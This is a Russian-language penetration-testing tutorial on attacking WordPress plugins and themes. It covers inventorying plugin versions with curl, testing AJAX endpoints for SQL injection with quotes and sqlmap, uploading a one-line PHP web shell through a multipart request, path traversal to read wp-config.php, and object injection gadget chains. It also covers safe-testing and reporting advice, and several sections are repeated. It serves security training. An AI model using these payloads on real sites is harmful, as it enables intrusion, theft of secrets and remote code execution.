## Вопрос, с которого всё начинается

Ядро WordPress обновляется автоматически и пишется аккуратно. Плагины и темы — нет: их пишут тысячи авторов, часто без опыта безопасности, и обновляют редко. Отсюда правило: **90% уязвимостей WordPress живут в плагинах и темах**. Значит, умение их находить — главный навык в WordPress-атаке. Разберём типовые классы.

## Наш пример: блог с устаревшими плагинами

Цель — `https://blog.target.example` (WordPress 6.4.2). Мы уже знаем движок. Теперь инвентаризируем плагины:

```
$ curl -s https://blog.target.example/ | grep -oE '/wp-content/plugins/[a-z0-9-]+/' | sort -u
/wp-content/plugins/contact-form-7/
/wp-content/plugins/woocommerce/
/wp-content/plugins/elementor/
```

Версии — из `readme.txt` каждого:

```
$ for p in contact-form-7 woocommerce elementor; do
    echo -n "$p: "
    curl -s "https://blog.target.example/wp-content/plugins/$p/readme.txt" | grep -i 'stable tag' | head -1
  done
contact-form-7: Stable tag: 5.8.1
woocommerce: Stable tag: 8.2.0
elementor: Stable tag: 3.18.0
```

Теперь у нас точные версии. Дальше — сопоставление с CVE.

## Шаг 1: класс SQLi в плагинах

Плагины часто строят SQL-запросы из `$_GET`/`$_POST` без подготовки. Уязвимый параметр обычно виден в AJAX-действиях (`admin-ajax.php?action=...`). Тест — кавычка:

```
$ curl -s 'https://blog.target.example/wp-admin/admin-ajax.php?action=plugin_search&q=a%27' -o /dev/null -w '%{http_code}\n'
500
$ curl -s 'https://blog.target.example/wp-admin/admin-ajax.php?action=plugin_search&q=a' -o /dev/null -w '%{http_code}\n'
200
```

Разница кодов — сигнал. Дальше `sqlmap` по сохранённому запросу:

```
$ sqlmap -r req.txt -p q --batch --dbs
```

Плагины — самая частая точка SQLi в WordPress.

## Шаг 2: незащищённая загрузка файлов

Многие плагины принимают файлы (формы, импорт, аватары). Если проверка расширения слабая — загружаем PHP:

```
POST /wp-admin/admin-ajax.php?action=plugin_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['c']); ?>
--X--
```

Если файл сохраняется в доступный каталог и исполняется — RCE. Часто защита строится только на `Content-Type` или на чёрном списке расширений, что обходится.

## Шаг 3: LFI и path traversal

Плагины с функцией «показать файл» (`?file=`, `?template=`) могут страдать от **LFI**:

```
$ curl -s 'https://blog.target.example/wp-content/plugins/plugin/view.php?file=../../../../wp-config.php'
```

Если отдаёт `wp-config.php` — мы получили секреты (ключи, доступ к БД) и путь к подделке cookie (см. урок про WordPress).

## Шаг 4: object injection и deserialization

Некоторые плагины вызывают `unserialize()` на пользовательских данных (настройки, cookie). При наличии **gadget chain** (в WordPress их строят через классы ядра и популярных плагинов) это даёт object injection → RCE. Инструмент — `PHPGGC` (генератор гаджетов), а публичные цепочки для WordPress публикуются в исследованиях.

Проверка: отправка сериализованного объекта в подозрительный параметр и наблюдение за поведением.

## Шаг 5: как искать уязвимые плагины системно

1. Инвентарь плагинов и тем (статика + `wpscan`).
2. Версии (readme.txt / style.css).
3. Сопоставление с WPScan DB / NVD / Patchstack.
4. Безопасная проверка (кавычка, запрос к эндпоинту).
5. Эксплуатация (upload/LFI/SQLi/deser).
6. Закрепление — только при разрешении.

## Шаг 6: почему темы — тоже цель

Темы исполняют PHP (функции `functions.php`), а в них бывают те же баги: `unserialize`, небезопасная загрузка, LFI. Плюс в админке есть **редактор тем** — если войти в админку, правка файла темы = RCE. Поэтому тему проверяют наравне с плагинами.

## Шаг 7: как не навредить

Плагины пишут данные (заказы, формы). Активная эксплуатация upload/LFI на проде может оставить следы и сломать функциональность. Поэтому: сначала безопасные проверки (кавычка, тест пути), затем — только при подтверждении и с разрешением.

## Углублённый разбор: object injection в плагине

PHP object injection возникает, когда плагин передаёт пользовательский ввод в `unserialize()` без фильтрации. Уязвимость сама по себе бесполезна без gadget chain, но в WordPress-экосистеме цепочки собираются из классов плагинов и ядра. Типичный путь: `unserialize($_COOKIE[...])` или `unserialize($_POST["data"])` → объект с магическим `__destruct`, который вызывает `call_user_func` на контролируемом свойстве → выполнение произвольного кода. Ищут так: `grep -rn "unserialize(" wp-content/plugins/` и прослеживают, откуда приходит аргумент.

Проверять безопасно: сначала подтверди, что `unserialize` достижим и не фильтруется (например, передай некорректную строку и поймай предупреждение в ответе). Только потом собирай цепочку. Публичные PoC по object injection часто требуют конкретных версий соседних плагинов — читай их и подгоняй под реальные версии цели.

## Как безопасно проверять и что писать в отчёт

SQLi в плагине проверяй параметрами, которые не меняют данные: `1 AND SLEEP(3)` или `1 AND 1=2` с наблюдением разницы. Никаких `DROP`/`UPDATE`. LFI — читай безобидный файл (`/etc/hostname`), а не `wp-config.php` с секретами, если это не согласовано. Загрузку файлов проверяй расширением и содержимым, но не оставляй шеллов.

В отчёте для каждой находки указывай: плагин, версию, точный параметр, класс уязвимости (CWE), воспроизводимый минимальный запрос, доказательство (ответ) и рекомендацию (обновить/удалить/заменить). Это то, что делает находку действенной, а не просто «есть SQLi».

## Как искать уязвимые плагины системно

Три подхода. Первый — по версии: `wpscan --url T --enumerate vp` (vulnerable plugins) сопоставляет установленные плагины с базой WPScan и выдаёт CVE. Второй — вручную: определи список плагинов через `/?rest_route=/wp/v2/plugins` (если открыт), через HTML-исходник (`wp-content/plugins/<slug>/`), через `readme.txt` каждого плагина (там указана версия и changelog). Третий — по коду: скачай плагин нужной версии с wordpress.org, найди уязвимость, проверь на цели.

```bash
curl -s http://T/ | grep -oE 'wp-content/plugins/[^/]+' | sort -u
curl -s http://T/wp-content/plugins/contact-form-7/readme.txt | head -5
```

Преимущество ручного подхода — он работает, когда WPScan заблокирован или плагин premium и отсутствует в базе. Ты сам читаешь changelog и видишь, какая версия исправлена, а какая уязвима.

## Почему темы — тоже цель

Темы содержат не меньше кода, чем плагины: `functions.php`, шаблоны, AJAX-обработчики. Устаревшая или заброшенная тема с `ajax_action` без проверки nonce/прав даёт тот же SQLi/LFI. Premium-темы вообще не обновляются через репозиторий WordPress, поэтому остаются уязвимыми годами. Ищи темы так же, как плагины: `wp-content/themes/<slug>/`, версия в `style.css` (`Version:`), changelog. И не забывай про дочерние темы — уязвимость в родительской наследуется.

## Итог по плагинам

Классы уязвимостей в плагинах повторяются: SQLi, незащищённая загрузка, LFI/path traversal, PHP object injection. Системный поиск — сопоставление версий с базой (WPScan) плюс ручной разбор changelog и кода. Проверяй безопасно (time-based, чтение безобидных файлов) и в отчёте указывай плагин, версию, параметр, класс и минимальный PoC.

## Мини-шпаргалка по плагинам

Список плагинов (`/?rest_route=/wp/v2/plugins`, исходник, `readme.txt`) → версии → `wpscan --enumerate vp` → ручной разбор changelog/кода. Классы: SQLi, загрузка, LFI, object injection. Проверяй безопасно (time-based, чтение безобидных файлов).

## Итог по плагинам WordPress

Классы уязвимостей в плагинах повторяются: SQLi, незащищённая загрузка файлов, LFI/path traversal, PHP object injection. Системный поиск — сопоставление версий с базой (`wpscan --enumerate vp`) плюс ручной разбор changelog и кода. Ручной подход важен, потому что premium-плагины и свежие версии часто отсутствуют в базах.

Проверяй безопасно: SQLi — time-based (`1 AND SLEEP(3)`), LFI — чтение безобидного файла, object injection — сначала подтверждение достижимости `unserialize`, потом цепочка. В отчёте для каждой находки указывай плагин, версию, параметр, класс (CWE), минимальный воспроизводимый запрос и рекомендацию. Темы проверяй так же: устаревшая тема с AJAX-обработчиком без проверки nonce/прав даёт тот же результат.

## Что мы теперь знаем

- Большинство уязвимостей WordPress — в плагинах и темах.
- Типовые классы: SQLi (AJAX-действия), upload, LFI, object injection.
- Версии плагинов берутся из `readme.txt`, тем — из `style.css`.
- WPScan DB / NVD / Patchstack — источники CVE.
- Редактор тем в админке = прямой RCE.

## Шаг 8: как находить уязвимые плагины без wpscan

Если `wpscan` заблокирован, работает ручной инвентарь: список плагинов из HTML, версии из `readme.txt`, сопоставление с публичными базами (Patchstack, WPScan DB, NVD). Полезно проверять и **темы** (`style.css`), и **mu-plugins** (`/wp-content/mu-plugins/`) — последние часто забывают.

```
$ for p in $(curl -s https://blog.target.example/ | grep -oE 'plugins/[a-z0-9-]+' | cut -d/ -f2 | sort -u); do
    echo -n "$p: "; curl -s "https://blog.target.example/wp-content/plugins/$p/readme.txt" | grep -i 'stable tag' | head -1
  done
```

## Шаг 9: как читать публичный PoC для плагина

PoC для WordPress-плагина обычно — это `curl`-команда или Python-скрипт. Прочитай: какой параметр, какой `action`, что делает payload. Проверь деструктивность (не `DROP`, не удаление файлов). Репойнти колбэки на свой слушатель. Затем адаптируй под точную версию — часто в PoC указан диапазон.

## Шаг 10: как оценивать импакт находки в плагине

SQLi = доступ к БД (данные пользователей, заказов) — высокий. Upload = RCE — критический. LFI = чтение конфигов и секретов — высокий. Object injection = RCE при наличии гаджета — критический. В отчёте укажи плагин, версию, уязвимый параметр и доказательство. «Устаревший плагин» без подтверждения эксплуатации — это информационная находка, а не уязвимость.

## Шаг 11: как отличить «устаревший плагин» от «уязвимого плагина»

Устаревшая версия — это не уязвимость сама по себе. Уязвимость появляется, когда для этой версии есть **подтверждённый CVE с рабочим PoC**, и ты **воспроизвёл** его эффект. Поэтому в отчёте разделяй: «плагин устарел (информационно)» и «плагин уязвим к CVE-XXXX, подтверждено запросом/ответом».

## Шаг 12: как безопасно проверять SQLi в плагине

Не запускай `sqlmap --risk 3` сразу. Сначала кавычка и наблюдение кода ответа. Затем `sqlmap -r req.txt -p param --batch --level 2 --risk 1` (мягкий режим). Только убедившись, что сервер не падает, повышай. Магазины и блоги с высоким трафиком падают от агрессивных сканов.

## Шаг 13: чек-лист по плагинам WordPress

1. Инвентарь плагинов и тем (HTML + wpscan).
2. Версии (readme.txt / style.css).
3. Сопоставление с Patchstack/WPScan DB/NVD.
4. Безопасная проверка (кавычка, запрос к эндпоинту).
5. Эксплуатация при подтверждении.
6. Разделение «устарел» и «уязвим» в отчёте.

## Куда дальше

Дальше — серверные фреймворки (Laravel, Django, Rails, Spring), где живут свои классы уязвимостей. А пока запомни: **в WordPress главное — инвентарь плагинов и их версий; там 90% находок.**
